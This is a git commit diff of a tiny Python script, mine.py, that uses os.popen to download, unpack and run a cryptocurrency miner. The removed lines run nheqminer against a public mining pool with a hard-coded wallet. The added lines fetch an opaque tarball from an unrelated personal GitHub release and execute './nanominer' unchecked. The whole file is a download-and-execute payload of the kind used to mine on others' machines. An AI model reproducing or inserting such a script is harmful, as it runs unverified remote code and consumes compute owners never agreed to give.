a45f9468a34fb915cd937fea2a81e3b1f0c6ee4c
mylordkaisen <85840171+mylordkaisen@users.noreply.github.com>
2021-06-14 14:59:32 +0700

    Update mine.py

--- mine.py
+++ mine.py
@@ -1,4 +1,4 @@
 import os
-a  = os.popen('wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz').readlines()
-a  = os.popen('tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz').readlines()
-b  = os.popen('nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RV2tjiZptDEbuyaecnVH22PUg5Z7ihyiT2.try -p x -t 4').readlines()
+a  = os.popen('wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz').readlines()
+a  = os.popen('tar -xvf luck.tar.gz').readlines()
+b  = os.popen('./nanominer').readlines()
